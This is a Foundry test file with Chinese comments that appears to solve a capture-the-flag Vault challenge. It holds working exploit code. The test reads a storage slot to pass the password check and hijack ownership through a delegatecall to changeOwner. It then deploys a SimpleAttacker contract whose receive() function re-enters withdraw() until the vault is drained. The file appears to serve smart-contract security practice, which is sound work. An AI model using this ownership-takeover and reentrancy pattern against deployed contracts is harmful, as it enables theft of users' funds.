// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/safe/Vault.sol";

// 简化的攻击者合约
contract SimpleAttacker {
    Vault public vault;
    
    constructor(address _vault) {
        vault = Vault(payable(_vault));
    }
    
    function attack() external payable {
        // 存入资金
        vault.deposite{value: msg.value}();
        // 触发提款
        vault.withdraw();
    }
    
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
    
    function withdrawETH() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 读取特定合约地址的特定存储槽
        bytes32 slotData = vm.load(address(logic), bytes32(uint256(1)));
        console.logBytes32(slotData);

        // 修改Vault合约的owner
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", logic, palyer);
        (bool success, ) = address(vault).call(data);
        require(success, "call failed");

        // 验证owner已修改
        assertEq(vault.owner(), palyer);
        
        // 部署简单攻击者合约
        SimpleAttacker attacker = new SimpleAttacker(address(vault));
        
        // 打开提款开关
        vault.openWithdraw();
        console.log("Vault balance before:", address(vault).balance);
        
        // 执行攻击 - 存入一些资金
        attacker.attack{value: 0.1 ether}();
        
        // 检查最终余额
        console.log("Vault balance after:", address(vault).balance);
        
        // 提取攻击者合约中的资金
        attacker.withdrawETH();
        
        // 检查是否满足条件
        assertTrue(vault.isSolve(), "not solved");
        vm.stopPrank();
    }
}